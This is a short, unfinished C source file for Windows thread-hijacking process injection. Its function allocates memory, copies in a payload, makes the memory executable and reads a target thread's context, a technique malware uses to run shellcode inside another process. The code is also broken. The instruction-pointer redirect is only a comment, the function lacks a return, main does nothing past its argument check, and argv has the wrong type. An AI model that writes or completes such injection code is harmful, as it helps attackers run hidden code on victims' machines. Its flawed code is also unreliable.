#include "functions.h"

BOOL ThreadHijacking(IN HANDLE hThread,IN PBYTE pPayload,IN SIZE_T szPayload) {

    PVOID pAddress;
    DWORD    dwOldProtection = NULL;
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;  // Specify what parts of the context you want to retrieve

    //Here we allocate memory and change memory protection

    pAddress = VirtualAlloc(NULL, szPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n",GetLastError());
        return FALSE;
    }
    memcpy(pAddress, pPayload, szPayload);


    if (!VirtualProtect(pAddress, szPayload, PAGE_EXECUTE_READWRITE,&dwOldProtection)) {
        printf("[!] Virtualprotect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }


    //change the Rip pointer to point on our payload

    if (!GetThreadContext(hThread, &ctx)) {
        warning("get thread context failed");
    }

}



int main(int argc, char* argv) {

    if (argc < 2) {
        printf("Usage: <exe> <Process Name>\n");
        return EXIT_FAILURE;
    }


}
